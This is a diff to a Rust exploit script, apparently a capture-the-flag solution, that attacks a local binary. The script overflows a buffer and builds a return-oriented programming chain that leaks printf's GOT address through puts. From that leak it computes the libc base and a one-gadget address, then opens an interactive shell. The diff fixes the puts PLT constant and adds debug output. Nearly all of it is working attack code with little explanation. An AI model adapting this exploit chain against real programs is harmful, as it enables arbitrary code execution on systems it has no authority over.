@@ -3,6 +3,7 @@ use pwntools::util::P64;
 use pwntools::{process::Process, pwn::*};
 use std::convert::TryInto;
 use std::io;
+use std::str;
 
 #[derive(Clap)]
 struct Opts {
@@ -19,9 +20,13 @@ fn main() -> io::Result<()> {
     let elf = Pwn::new(&opts.elf_file);
     let libc = Pwn::new(&opts.libc_file);
     let mut s = Process::new(&opts.elf_file)?;
-    s.sendline(&b"-33 6")?;
-    s.sendline(&b"3")?;
-    // println!(s.recvuntil("Do you want to report the problem?\n> "));
+
+    s.sendline(b"-33 6")?;
+    s.sendline(b"3")?;
+    println!(
+        "{:?}",
+        s.recvuntil(b"Do you want to report the problem?\n> ")
+    );
     s.send(&b"\0".repeat(32))?;
     s.send(&P64(0xdeadbeef))?;
 
@@ -31,7 +36,7 @@ fn main() -> io::Result<()> {
     s.send(&P64(POP_RDI))?;
     s.send(&P64(elf.got("printf").unwrap()))?;
     // s.send(P64(elf.plt("puts"))) ここなんか定数じゃないとだめなんや
-    const PUTS_PLT: u64 = 0x0040063;
+    const PUTS_PLT: u64 = 0x00400630;
     s.send(&P64(PUTS_PLT))?;
 
     const WRITABLE_REGION: u64 = 0x602100;
@@ -63,7 +68,7 @@ fn main() -> io::Result<()> {
     s.send(&P64(CALL))?;
     s.send(&b"\0".repeat(0x50))?;
 
-    s.sendline(&b"")?;
+    s.sendline(b"")?;
 
     // todo!("ここから recvline実装");
 
@@ -76,19 +81,23 @@ fn main() -> io::Result<()> {
 
     // https://doc.rust-lang.org/std/primitive.slice.html#method.strip_suffix
 
-    let mut x = s.recvline()?.strip_suffix(b"\n").unwrap().to_vec();
+    dbg!(std::str::from_utf8(&s.recvline()?));
+
+    let mut x = dbg!(s.recvline())?.strip_suffix(b"\n").unwrap().to_vec();
     x.resize(8, b'\x00');
     let printf_addr = u64::from_le_bytes(x.try_into().unwrap());
-    println!("{:?}", printf_addr);
+    println!("printf_addr 0x{:x}", printf_addr);
 
     const LIBC_GADGET_OFFSET: u64 = 0xe6c7e;
     // const LIBC_GADGET_OFFSET: u64 = 0x4f432;
     let libc_base_addr = printf_addr - libc.symbol("printf").unwrap();
     let gadget_addr = libc_base_addr + LIBC_GADGET_OFFSET;
 
+    println!("gadget_addr: 0x{:x}", gadget_addr);
+
     s.send(&P64(0))?;
     s.send(&P64(gadget_addr))?;
-    s.sendline(&b"")?;
+    s.send(b"\n")?;
     s.interactive()?;
 
     // collectはFromIteratorを実装している任意の型 (通常はコンテナっぽい型) に変換できる
